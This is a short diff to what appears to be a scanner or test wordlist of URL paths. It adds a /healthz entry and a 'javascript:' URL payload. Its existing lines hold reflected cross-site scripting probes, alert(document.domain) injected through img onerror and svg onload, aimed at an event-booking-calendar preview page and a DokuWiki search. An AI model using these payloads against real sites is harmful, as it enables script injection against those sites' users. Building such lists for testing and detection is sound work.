@@ -6,3 +6,5 @@
 /scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
 /preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
 /doku.php?id=start&do=search&q=the%20%40%3Csvg%2Fonload%3Dalert%60document.domain%60%3E
+/healthz
+/workspace?url=javascript%3Aalert%28document.domain%29
